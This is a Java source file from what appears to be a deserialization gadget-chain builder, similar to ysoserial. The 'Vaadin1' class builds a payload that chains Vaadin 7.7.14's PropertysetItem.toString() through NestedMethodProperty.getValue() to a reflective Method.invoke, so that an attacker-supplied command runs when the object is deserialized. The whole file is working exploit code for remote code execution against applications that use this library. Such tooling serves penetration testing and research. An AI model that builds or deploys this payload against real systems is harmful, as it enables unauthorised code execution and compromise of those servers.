package org.ses.gadgetbuilder.chains1;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;

@Dependencies( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@Authors({ Authors.KULLRICH })
@Impact(Impact.MethodInvoke)
public class Vaadin1 extends MethodInvokeGadgetChain<ToStringTrampoline, GetterMethodInvokeAdapter> {

    public Vaadin1(ToStringTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        PropertysetItem pItem = new PropertysetItem ();
        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(
                this.methodInvokeAdapter.getInvocationTarget(command), this.methodInvokeAdapter.getGetterMethodProperty());
        pItem.addItemProperty ("outputProperties", nmprop);

        return new TrampolineConnector(pItem);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.vaadin.data.util.PropertysetItem.toString()\n" +
                "com.vaadin.data.util.NestedMethodProperty.getValue()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
